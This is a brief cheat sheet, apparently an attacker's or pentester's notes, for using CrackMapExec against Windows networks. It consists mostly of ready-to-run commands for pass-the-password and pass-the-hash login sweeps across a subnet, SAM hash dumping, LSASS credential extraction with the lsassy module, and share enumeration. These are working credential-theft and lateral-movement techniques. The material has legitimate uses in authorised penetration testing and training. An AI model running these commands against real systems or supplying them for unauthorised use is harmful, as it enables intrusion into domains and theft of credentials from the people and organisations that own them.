*Crackmapexec* stores results and loot in a database.
Connect to the CME database:
```bash
cmedb
```

---
# Pass-the-password attack

Sweep the whole domain and try to login to SMB services with known credentials:
```bash
crackmapexec smb 10.0.0.0/24 -d <AD-domain> -u <user> -p <password>
```
If the AD-user is a local administrator we can also use the following arguments:
`--sam`: dump SAM hashes from target systems
`-M lsassy`: module lsassy to dump lsass creds

# Pass-the-hash attack

Use local (not domain) NTLM-hash:
```bash
crackmapexec smb 10.0.0.0/24 -u <user> -H <NTLM-hash> --local-auth
```
Args:
`-H`: NTLM hash
`--local-auth`: authenticate locally


**Dump SAM database:**
```bash
crackmapexec smb 10.0.0.0/24 -u <user> -H <NTLM-hash> --local-auth --sam
```
Args:
`--sam`: dump SAM hashes from target systems


**Enumerate shares:**
```bash
crackmapexec smb 10.0.0.0/24 -u <user> -H <NTLM-hash> --local-auth --shares
```
Args:
`--shares`: enumerate shares and access


**Dump lsass credentials:**
Requires credentials of an administrative user.
```bash
crackmapexec smb 10.0.0.0/24 -u <user> -H <NTLM-hash> --local-auth -M lsassy
```
